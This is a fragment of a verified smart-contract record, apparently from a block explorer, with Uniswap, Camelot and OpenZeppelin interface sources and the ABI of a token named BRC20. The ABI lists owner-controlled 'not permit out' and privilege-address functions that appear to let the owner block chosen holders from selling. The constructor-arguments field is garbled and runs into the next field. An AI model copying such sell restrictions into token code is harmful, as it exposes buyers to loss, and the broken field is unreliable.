\"contracts/IHybridRouter/IHybridRouter.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity >=0.8.17;\\r\\n\\r\\nimport '../IUniswapV2/IUniswapV2Router02.sol';\\r\\nimport '../ICamelotRouter/ICamelotRouter.sol';\\r\\n\\r\\ninterface IHybridRouter is IUniswapV2Router02, ICamelotRouter {\\r\\n}\\r\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/utils/Context.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/ICamelotRouter/ICamelotRouter.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity >=0.6.2;\\r\\n\\r\\nimport '../IUniswapV2/IUniswapV2Router01.sol';\\r\\n\\r\\ninterface ICamelotRouter is IUniswapV2Router01 {\\r\\n    //    function removeLiquidityETHSupportingFeeOnTransferTokens(\\r\\n    //        address token,\\r\\n    //        uint liquidity,\\r\\n    //        uint amountTokenMin,\\r\\n    //        uint amountETHMin,\\r\\n    //        address to,\\r\\n    //        uint deadline\\r\\n    //    ) external returns (uint amountETH);\\r\\n\\r\\n    //    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\r\\n    //        address token,\\r\\n    //        uint liquidity,\\r\\n    //        uint amountTokenMin,\\r\\n    //        uint amountETHMin,\\r\\n    //        address to,\\r\\n    //        uint deadline,\\r\\n    //        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    //    ) external returns (uint amountETH);\\r\\n\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        address referrer,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n\\r\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        address referrer,\\r\\n        uint deadline\\r\\n    ) external payable;\\r\\n\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        address referrer,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n\\r\\n\\r\\n}\"\r\n    },\r\n    \"contracts/IUniswapV2/IUniswapV2Router02.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity >=0.6.2;\\n\\nimport './IUniswapV2Router01.sol';\\n\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountETH);\\n\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountETH);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\"\r\n    },\r\n    \"contracts/IUniswapV2/IUniswapV2Router01.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity >=0.6.2;\\n\\ninterface IUniswapV2Router01 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n\\n    function removeLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB);\\n\\n    function removeLiquidityETH(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountToken, uint amountETH);\\n\\n    function removeLiquidityWithPermit(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountA, uint amountB);\\n\\n    function removeLiquidityETHWithPermit(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountToken, uint amountETH);\\n\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n\\n    function swapTokensForExactTokens(\\n        uint amountOut,\\n        uint amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\n    external\\n    payable\\n    returns (uint[] memory amounts);\\n\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\n    external\\n    returns (uint[] memory amounts);\\n\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n    external\\n    returns (uint[] memory amounts);\\n\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\n    external\\n    payable\\n    returns (uint[] memory amounts);\\n\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\n\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\n\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\n\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n *\\n * _Available since v4.1._\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string[2]\",\"name\":\"strings\",\"type\":\"string[2]\"},{\"internalType\":\"address[2]\",\"name\":\"addresses\",\"type\":\"address[2]\"},{\"internalType\":\"uint256[43]\",\"name\":\"uint256s\",\"type\":\"uint256[43]\"},{\"internalType\":\"bool[2]\",\"name\":\"bools\",\"type\":\"bool[2]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"VERSION\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"name\":\"batchSetRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"routerFactor\",\"type\":\"uint256\"}],\"name\":\"calcRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initializePair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isForceTradeInToNotPermitOut\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPrivilegeAddresses\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isUseNotPermitOut\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"notPermitOutAddressStamps\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refreshUniswapRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"isForceTradeInToNotPermitOut_\",\"type\":\"bool\"}],\"name\":\"setIsForceTradeInToNotPermitOut\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isPrivilegeAddress\",\"type\":\"bool\"}],\"name\":\"setIsPrivilegeAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"isUseNotPermitOut_\",\"type\":\"bool\"}],\"name\":\"setIsUseNotPermitOut\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"notPermitOutAddressStamp\",\"type\":\"uint256\"}],\"name\":\"setNotPermitOutAddressStamp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setRouterVersion\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"uniswap_\",\"type\":\"address\"}],\"name\":\"setUniswapRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IHybridRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BRC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000060000000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052b7d2dcc80cd2eersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}